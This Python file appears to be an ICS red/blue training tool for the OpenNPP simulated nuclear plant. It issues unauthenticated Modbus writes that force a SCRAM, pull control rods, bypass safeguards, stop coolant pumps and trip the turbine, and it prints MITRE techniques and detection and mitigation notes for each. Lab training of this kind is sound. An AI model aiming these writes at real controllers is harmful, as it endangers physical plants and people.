#!/usr/bin/env python3
"""
OpenNPP — ferramenta de exercicio de OT/ICS (red/blue) contra a planta SIMULADA.

  ⚠  USO EXCLUSIVO NO LABORATORIO OpenNPP (ambiente virtual isolado).
     Alvo padrao: o simulador local. Cada cenario imprime a tecnica (MITRE
     ATT&CK for ICS) e as notas de DETECCAO/MITIGACAO — o objetivo e' defensivo.

Requer pymodbus (rode dentro do container do simulador ou num venv):
    python3 tools/attacks.py recon
    python3 tools/attacks.py scram
    python3 tools/attacks.py list

Alvo Modbus: --host 127.0.0.1 --port 5020   (mapeado do simulador; ver compose)
"""

import argparse
import os
import sys
import time

# reutiliza o mapa de I/O (fonte unica de verdade)
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "simulator"))
from npp import iomap as M  # noqa: E402

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    sys.exit("pymodbus nao instalado. Rode dentro do container do simulador ou 'pip install pymodbus'.")

BANNER = "=" * 70


def connect(host, port):
    c = ModbusTcpClient(host, port=port)
    if not c.connect():
        sys.exit(f"nao conectou em {host}:{port} (o simulador esta no ar?)")
    return c


def _note(tecnica, mitre, deteccao, mitigacao):
    print(f"\n  Tecnica : {tecnica}")
    print(f"  MITRE   : {mitre}")
    print(f"  Deteccao: {deteccao}")
    print(f"  Mitigar : {mitigacao}\n")


# --------------------------------------------------------------------- recon
def recon(c, args):
    print(BANNER); print("RECON — leitura completa dos registradores (sem autenticacao)")
    _note("Enumeracao de pontos/tags via Modbus",
          "Discovery T0846 / Point & Tag ID T0861",
          "IDS de OT alarma leitura em massa de faixas incomuns por host novo.",
          "Allow-list de mestres; segmentar rede; monitorar varredura Modbus.")
    ir = c.read_input_registers(0, len(M.INPUT_REGISTERS))
    di = c.read_discrete_inputs(0, len(M.DISCRETE_INPUTS))
    co = c.read_coils(0, len(M.COILS))
    hr = c.read_holding_registers(0, len(M.HOLDING_REGISTERS))
    print("\n-- Sensores (Input Registers) --")
    for p in M.INPUT_REGISTERS:
        print(f"   IR{p.addr:<2} {p.key:<24} {M.decode(ir.registers[p.addr], p):>10.2f} {p.unit}")
    print("\n-- Status (Discrete Inputs) --")
    for p in M.DISCRETE_INPUTS:
        if di.bits[p.addr]:
            print(f"   DI{p.addr:<2} {p.key:<24} = 1  ({p.label})")
    print("\n-- Comandos (Coils) ativos --")
    for p in M.COILS:
        if co.bits[p.addr]:
            print(f"   CO{p.addr:<2} {p.key:<24} = 1")


# ------------------------------------------------------------- SCRAM indevido
def scram(c, args):
    print(BANNER); print("ATAQUE — SCRAM indevido (escrita de coil sem autorizacao)")
    _note("Comando nao autorizado -> parada forcada do reator (perda de producao)",
          "Impair Process Control / Unauthorized Command Message T0855; Loss of Control T0827",
          "Coil cmd_manual_scram escrito por host que nao e' o CLP/operador legitimo.",
          "Allow-list de mestres; registrar origem de cada escrita; alarme de trip sem causa de processo.")
    p = M.CO_BY_KEY["cmd_manual_scram"]
    c.write_coil(p.addr, True)
    print("   -> escrito cmd_manual_scram = 1")
    time.sleep(6)
    ir = c.read_input_registers(0, 1)
    print(f"   -> potencia agora: {M.decode(ir.registers[0], M.IR_BY_KEY['reactor_power_pct']):.1f}% (reator desarma)")


# ------------------------------------------------ manipulacao de setpoint/barras
def rod_pull(c, args):
    print(BANNER); print("ATAQUE — retirada de barras / excursao de potencia (manipulacao de parametro)")
    _note("Forcar manual e puxar barras para inserir reatividade positiva",
          "Modify Parameter T0836 / Manipulation of Control T0831",
          "cmd_auto_control->0 e dmd_rod subindo sem ordem do operador; fluxo subindo.",
          "Proteger setpoints; RPS por fluxo alto (defesa que ESTE ataque dispara — DID funcionando).")
    c.write_coil(M.CO_BY_KEY["cmd_auto_control"].addr, False)   # tira do automatico
    p = M.HR_BY_KEY["dmd_rod_pct"]
    c.write_register(p.addr, M.encode(100.0, p))                # barras totalmente retiradas
    print("   -> auto OFF, dmd_rod = 100% (retirada maxima)")
    for _ in range(8):
        time.sleep(2)
        ir = c.read_input_registers(0, 4)
        di = c.read_discrete_inputs(0, 1)
        print(f"      potencia={M.decode(ir.registers[0], M.IR_BY_KEY['reactor_power_pct']):6.1f}%  "
              f"tripped={bool(di.bits[0])}")
    print("   Observacao: o RPS desarma por fluxo alto -> um ataque de camada unica e' contido (DID).")


# ------------------------------------------------------- bypass de salvaguardas
def block_safety(c, args):
    print(BANNER); print("ATAQUE — bloqueio das salvaguardas (inibicao de funcao de resposta)")
    _note("Acionar cmd_block_safety (bypass de manutencao) para derrubar a camada DID de salvaguardas",
          "Inhibit Response Function T0804 / Loss of Safety T0880",
          "Bit safety_blocked = 1 em operacao normal NUNCA deveria ocorrer -> alarme imediato.",
          "Remover/segregar o bypass; exigir chave fisica; alarmar qualquer ativacao.")
    c.write_coil(M.CO_BY_KEY["cmd_block_safety"].addr, True)
    print("   -> escrito cmd_block_safety = 1 (ESFAS/PXS inibido)")
    di = c.read_discrete_inputs(0, len(M.DISCRETE_INPUTS))
    print(f"   -> safety_blocked = {bool(di.bits[M.DI_BY_KEY['safety_blocked'].addr])}")
    print("   Combine com outro transiente para ver a diferenca SEM a camada de salvaguardas.")


# ------------------------------------------------------------ perda de vazao
def stop_pumps(c, args):
    print(BANNER); print("ATAQUE — parada das 4 bombas do primario (perda de vazao)")
    _note("Desligar RCPs -> Thot dispara -> RPS por baixa vazao",
          "Unauthorized Command Message T0855 / Manipulation of Control T0831",
          "Coils cmd_rcpN_start -> 0 sem ordem; queda de vazao correlacionada.",
          "Allow-list; intertravamento fisico; alarme de parada de bomba nao comandada.")
    for k in ("cmd_rcp1_start", "cmd_rcp2_start", "cmd_rcp3_start", "cmd_rcp4_start"):
        c.write_coil(M.CO_BY_KEY[k].addr, False)
    print("   -> todas as RCPs desligadas")
    for _ in range(6):
        time.sleep(2)
        ir = c.read_input_registers(0, 11)
        di = c.read_discrete_inputs(0, 1)
        print(f"      vazao={M.decode(ir.registers[10], M.IR_BY_KEY['rcp_flow_pct']):5.1f}%  "
              f"Thot={M.decode(ir.registers[7], M.IR_BY_KEY['coolant_thot_c']):6.1f}C  tripped={bool(di.bits[0])}")


# ------------------------------------------------------- desarme de turbina
def turbine_trip(c, args):
    print(BANNER); print("ATAQUE — desarme de turbina (perda de geracao)")
    _note("Coil cmd_turbine_trip -> perde geracao; reator faz runback/trip",
          "Unauthorized Command Message T0855 / Loss of Productivity",
          "Desarme de turbina sem falha de processo correlata.",
          "Allow-list; correlacionar comando x condicao de maquina.")
    c.write_coil(M.CO_BY_KEY["cmd_turbine_trip"].addr, True)
    print("   -> cmd_turbine_trip = 1")
    time.sleep(5)
    ir = c.read_input_registers(0, len(M.INPUT_REGISTERS))
    print(f"   -> geracao: {M.decode(ir.registers[M.IR_BY_KEY['gen_power_mwe'].addr], M.IR_BY_KEY['gen_power_mwe']):.0f} MWe")


SCENARIOS = {
    "recon": recon, "scram": scram, "rod_pull": rod_pull,
    "block_safety": block_safety, "stop_pumps": stop_pumps, "turbine_trip": turbine_trip,
}


def main():
    ap = argparse.ArgumentParser(description="Exercicios de OT/ICS contra a planta SIMULADA OpenNPP (uso em laboratorio).")
    ap.add_argument("scenario", choices=list(SCENARIOS) + ["list"])
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=5020)
    args = ap.parse_args()

    if args.scenario == "list":
        print("Cenarios:", ", ".join(SCENARIOS)); return

    print("\n  OpenNPP — laboratorio OT. Ambiente SIMULADO. Uso defensivo/educacional.\n")
    c = connect(args.host, args.port)
    try:
        SCENARIOS[args.scenario](c, args)
    finally:
        c.close()
    print("\n" + BANNER)
    print("Blue team: reproduza a deteccao (capture o trafego Modbus, correlacione")
    print("comando x processo) e aplique a mitigacao. Ver docs/07-playbooks-ataque-defesa.md")


if __name__ == "__main__":
    main()
